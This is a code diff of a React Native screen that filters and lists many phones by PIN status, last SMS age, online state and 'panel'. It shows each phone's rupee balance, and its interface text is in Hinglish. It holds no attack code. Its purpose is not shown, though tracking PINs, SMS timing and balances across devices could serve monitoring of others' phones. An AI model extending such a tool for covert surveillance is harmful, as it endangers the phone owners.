@@ -17,16 +17,19 @@ import {
   findEntryForDevice,
   parseDeviceListTxt,
 } from '../lib/parseDeviceListTxt';
-import { buildFilteredDeviceList } from '../lib/deviceFilters';
 import { formatSmsAge } from '../lib/parseSmsTime';
+import { countPanels, runPhaseFetch } from '../lib/phaseFetch';
 import DeviceFilterToolbar from './DeviceFilterToolbar';
 
 export default function DevicePinGate({ injectedList }) {
   const [deviceId, setDeviceId] = useState('');
   const [entries, setEntries] = useState([]);
   const [sortOrder, setSortOrder] = useState('high_to_low');
-  const [pinMode, setPinMode] = useState('all');
-  const [smsAgeKey, setSmsAgeKey] = useState('all');
+  const [pinMode, setPinMode] = useState('both');
+  const [smsAgeKey, setSmsAgeKey] = useState('3d');
+  const [onlineMode, setOnlineMode] = useState('both');
+  const [phasedList, setPhasedList] = useState([]);
+  const [panelInfo, setPanelInfo] = useState(null);
   const [listName, setListName] = useState('');
   const [status, setStatus] = useState('');
   const [busy, setBusy] = useState(false);
@@ -52,15 +55,27 @@ export default function DevicePinGate({ injectedList }) {
     loadDeviceId();
   }, [loadDeviceId]);
 
-  const filteredList = useMemo(
-    () =>
-      buildFilteredDeviceList(entries, {
+  const startPhaseFetch = useCallback(() => {
+    if (!entries.length) {
+      setStatus('Pehle txt / Firestore se devices load karo');
+      return;
+    }
+    setBusy(true);
+    try {
+      const result = runPhaseFetch(entries, {
+        sortOrder,
         pinMode,
         smsAgeKey,
-        sortOrder,
-      }),
-    [entries, pinMode, smsAgeKey, sortOrder],
-  );
+        onlineMode,
+      });
+      setPhasedList(result);
+      setStatus(`Phase Fetch: ${result.length} devices (filter match)`);
+    } catch (e) {
+      setStatus(e.message || 'Phase fail');
+    } finally {
+      setBusy(false);
+    }
+  }, [entries, sortOrder, pinMode, smsAgeKey, onlineMode]);
 
   const countWithPin = useMemo(
     () => filterEntries(entries, 'with_pin').length,
@@ -74,6 +89,8 @@ export default function DevicePinGate({ injectedList }) {
   const runAccessCheck = useCallback(
     async (list, name, warn) => {
       setEntries(list);
+      setPhasedList([]);
+      setPanelInfo(countPanels(list));
       setListName(name);
 
       const id = deviceId || (await fetchDeviceId());
@@ -258,8 +275,13 @@ export default function DevicePinGate({ injectedList }) {
         onPinMode={setPinMode}
         smsAgeKey={smsAgeKey}
         onSmsAgeKey={setSmsAgeKey}
-        shownCount={filteredList.length}
+        onlineMode={onlineMode}
+        onOnlineMode={setOnlineMode}
+        panelInfo={panelInfo}
+        phasedCount={phasedList.length}
         totalCount={entries.length}
+        onStartPhase={startPhaseFetch}
+        phaseBusy={busy}
       />
 
       {entries.length > 0 ? (
@@ -269,11 +291,13 @@ export default function DevicePinGate({ injectedList }) {
       ) : null}
 
       <View style={styles.listBox}>
-        {filteredList.length === 0 ? (
-          <Text style={styles.muted}>Koi entry nahi — Firestore fetch / txt load</Text>
+        {phasedList.length === 0 ? (
+          <Text style={styles.muted}>
+            Filter select karo → Start Phase Fetch (pehle txt / Firestore load)
+          </Text>
         ) : (
           <FlatList
-            data={filteredList}
+            data={phasedList}
             keyExtractor={(e) => `${e.deviceId}-${e.label}`}
             style={styles.flatList}
             nestedScrollEnabled
@@ -288,7 +312,8 @@ export default function DevicePinGate({ injectedList }) {
                 </Text>
                 {e.label ? <Text style={styles.listLabel}>{e.label}</Text> : null}
                 <Text style={styles.smsMeta}>
-                  SMS: {formatSmsAge(e.lastSmsAt)} · Sort: {e.sortValue ?? 0}
+                  Bal ₹{e.balance ?? 0} · SMS {formatSmsAge(e.lastSmsAt)} ·{' '}
+                  {e.panel || '—'} · {e.online ? 'ONLINE' : 'offline'}
                 </Text>
                 {e.deviceId === deviceId.trim().toLowerCase() ? (
                   <Text style={styles.thisDevice}>← yeh phone</Text>
